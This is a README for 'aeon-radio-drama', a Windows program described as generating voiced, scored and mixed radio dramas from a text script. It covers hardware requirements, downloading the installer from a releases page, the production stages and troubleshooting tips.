# 🎙️ aeon-radio-drama - Create professional radio dramas with ease

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Unsweetened-journalbox528/aeon-radio-drama/releases)

Aeon Radio Drama handles the entire production process for audiobooks and radio plays. You provide the script, and the software generates the vocal performances, background music, and sound effects. It mixes these elements into a final file using professional sidechain techniques. You achieve radio-quality results with a single command.

## ⚙️ System Requirements

This software runs on Windows 10 or Windows 11. Ensure your computer meets these minimum specifications for smooth performance:

*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
*   Memory: 16 GB RAM.
*   Graphics: NVIDIA GPU with at least 8 GB VRAM.
*   Storage: 50 GB free space for model files and project data.

If you have a newer computer with a modern graphics card, the software performs faster.

## 💾 Installation Steps

Follow these steps to set up the software on your computer.

1. Visit the [official releases page](https://github.com/Unsweetened-journalbox528/aeon-radio-drama/releases).
2. Locate the latest version under the Assets header.
3. Download the file ending in .exe to your computer.
4. Open the file once the download finishes.
5. Follow the prompts on your screen to complete the installation process.

The installer creates a shortcut on your desktop for quick access.

## 🚀 Getting Started

Launch the program using the desktop icon. A black window opens, which is the command terminal for the software. This interface manages the complex audio processing tasks in the background.

The software requires a plain text file containing your script. Use a standard text editor like Notepad to save your story. Organize your script with clear character names followed by their lines of dialogue.

To start your first project:

1. Place your script file in a known folder.
2. Type the command provided in the documentation within the program window.
3. Point the software to your script file.
4. Press Enter to begin the automated production.

## 🎧 Understanding the Process

Aeon Radio Drama uses four distinct technologies to build your project. The software manages these steps for you behind the scenes.

*   **Dialogue Generation:** The software uses Qwen3-TTS to assign lifelike voices to your characters. It follows your script cues to adjust tone and speed.
*   **Music Selection:** The ACE engine analyzes the emotional context of your scene and selects appropriate background music.
*   **Sound Effects:** The system identifies key actions in your script and inserts relevant audio clips like footsteps, door slams, or environmental textures using MMAudio, SAO, and ACE.
*   **Sidechain Mixing:** This final step lowers the volume of the music whenever a character speaks. This keeps the dialogue clear and ensures the production sounds like a professional radio broadcast.

## 🛠 Features

*   **One Command Production:** You do not need to edit audio tracks manually.
*   **Automated Mixing:** The software balances levels automatically across the entire project.
*   **High Quality Output:** Files save in standard formats for easy playback on any device.
*   **Customization:** You can modify the provided configuration files to change voice styles or music intensity if you require specific artistic choices.

## 📂 Project Management

Each project creates a dedicated folder on your computer. Inside this folder, the software keeps your script, the generated audio assets, and the final mix.

If you want to create a new version of your drama, save your script under a different name or move it to a new folder. The software creates a fresh production run for every script you process. 

Avoid moving or deleting files while the software runs. The terminal window displays progress bars for each stage of production. Wait until the window prompts you for a new command before you close it.

## 🔍 Troubleshooting Tips

If the program closes unexpectedly, check your available disk space. Audio production generates large temporary files. Clear your temporary files if your hard drive nears capacity.

Ensure your graphics card drivers are current. Outdated drivers often cause issues during the music generation phase. Visit the website of your graphics card manufacturer to download the latest driver software.

If the audio sounds distorted, check your system sound settings. Ensure your Windows output device is set to your preferred speakers or headphones.

If the program reports a file error, verify that your script file exists in the location you entered. Check for spelling errors in the file path. Keep file paths simple and avoid using special characters or long names.

For advanced configurations, edit the settings.json file found in the program directory. This file lets you adjust parameters like output volume, file format, and language models for the dialogue engine. Always save a backup of this file before you change any settings.

The software creates a log file in the project directory when errors occur. Review this log file to identify specific issues with your script or hardware. The text in this file describes the exact step where the production stopped.